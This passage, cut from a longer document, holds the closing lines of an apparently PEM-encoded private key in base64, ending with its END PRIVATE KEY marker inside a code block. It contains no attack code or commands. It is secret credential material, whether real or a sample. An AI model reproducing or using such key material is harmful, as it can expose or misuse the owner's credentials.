o/GCI/AR5ePT8Sw402Iqf9i2KlMg4rq2QDZPandRe92Br/HiAxgQTjDm+7VWTLKS
TN8/Xe0SswKBgDRGTHO5QrgpZaxlFf4sYhtxF4rMdN1EVNkCQND5U0V4SR3BlX0f
9CC8kKnImrTDqsDmEVCd3Kq5zsZdbKPtC2/k1aUAKl/eHOKQqeQKEdDKxxW632p+
c0a7y4ptVwr0co4bMFSVvO2a2rdk35WMqCEfZGzdUM8NcKBQKiLagR6RAoGAXF6Q
9V5ZF1deQOyk5xx6JHdy7pRh6SrSTB6IpZYQ72UTwwj7NbIW3ZKcoNrjiidEzTXy
xvxPjHmFOy6+xuXCAONs7wFPmMvW+8uQVmmYmigb1xH1/UieEkKyW7sd0rB4pxw5
+a92KxW8nB98H69SpJbkHisixDzaMVBEUBbMaU8CgYEAkeRdZR3L7v2GvleFtnJ3
ZGC/+CFHFALLn/gf8GDBQCmagQSa0y40h0YYNR0DVQZY5rnKDxzohC2JDTjXU59R
UpaoYtp3PK3/roYS/cWgmQ2Xr9v5E1MCpVqrz4OyCEs4u/b0c43giDxkwE0gA06n
7cHBPnWxQyF+laBmMed0YOA=
-----END PRIVATE KEY-----

```
